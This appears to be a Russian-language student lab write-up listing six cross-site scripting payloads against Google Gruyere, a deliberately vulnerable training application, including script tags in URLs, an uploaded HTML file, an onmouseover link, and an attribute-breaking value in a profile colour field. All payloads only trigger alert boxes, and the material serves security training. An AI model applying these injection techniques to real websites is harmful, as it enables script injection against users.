# Payloads для gruyere

_Пример оформления работы_

## Payload 1

При переходе по ссылке `https://google-gruyere.appspot.com/471219099744117471049220089557079986936/`, в адресную строку можно вставить <script>alert(9)</script> для xss 

## Payload 2
При загрузке файла на сайт можно загрузить html файл со скриптом. При его открытии возникает alert
'https://google-gruyere.appspot.com/471219099744117471049220089557079986936/neicy/html.html'

## payload 3
При создании снипетта можно создать ссылку, при наведении на которую будет выполняться скрипт. 
<a onmouseover="alert(1)" href="#">read this!</a>

## payload 4
В профиле можно изменить цвет ника. Вместо цветового кода выписываем red' onload='alert(1)' onmouseover='alert(2).
При наведении на ник будет выведен скрипт

## payload 5
В профиле можно доавить свою домашнюю страницу. В URL можно указать <script>alert(9)</script> 

## payload 6
В любом месте, где есть форма, в адресной стоке вписать <form><button%20formaction="javascript:javascript:alert(1)"><script>alert(9)</script>